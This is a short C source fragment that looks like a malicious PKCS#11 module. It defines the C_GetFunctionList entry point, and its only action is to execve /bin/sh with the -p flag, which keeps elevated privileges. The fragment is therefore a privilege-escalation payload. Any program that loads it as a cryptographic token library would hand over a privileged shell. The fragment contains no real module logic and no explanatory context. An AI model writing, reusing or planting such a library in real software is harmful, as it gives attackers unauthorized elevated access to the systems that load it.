int C_GetFunctionList(void) {
	char *argv[3] = {"/bin/sh", "-p", 0};

	execve(argv[0], argv, 0);
}
